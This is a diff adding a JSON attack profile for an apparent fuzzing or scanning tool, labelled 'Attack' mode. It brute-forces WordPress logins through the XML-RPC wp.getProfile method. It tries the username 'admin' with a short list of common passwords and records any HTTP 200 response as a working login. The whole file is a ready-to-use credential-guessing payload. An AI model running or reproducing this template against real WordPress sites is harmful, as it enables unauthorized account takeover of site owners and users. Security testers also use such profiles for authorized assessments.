@@ -1,0 +1,46 @@
+{
+    "Id": "WPXmlrpcProfileBF",
+    "Mode": "Attack",
+    "PayloadSet": [
+        {
+            "Id": "FUZZU",
+            "File": "",
+            "List": ["admin"]
+        },
+        {
+            "Id": "FUZZP",
+            "File": "",
+            "List": ["admin", "Password@123", "Welcome@123"]
+        }
+    ],
+    "RequestTemplate": {
+        "Method": "POST",
+        "UrlTemplate": "BASE",
+        "Header": {
+            "User-Agent": "DEFAULT"
+        },
+        "Body": [
+            "<?xml version=\"1.0\" encoding=\"utf-8\"?>",
+            "<methodCall><methodName>wp.getProfile</methodName><params><param><value><int>0</int></value></param>",
+            "<param><value><string>FUZZU</string></value></param>",
+            "<param><value><string>FUZZP</string></value></param>",
+            "<param><value><array><data><value><string>user_id</string></value><value><string>display_name</string></value><value><string>email</string></value></data></array></value></param></params></methodCall>"
+        ]
+    },
+    "ResponseAction": {
+        "FactConditions": [
+            {
+                "Conditions": [
+                    {
+                        "Field": "StatusCode",
+                        "Condition": "OneOf",
+                        "Values": ["200"]
+                    }
+                ],
+                "Facts": {
+                    "Login": "FUZZU:FUZZP"
+                }
+            }
+        ]
+    }
+}
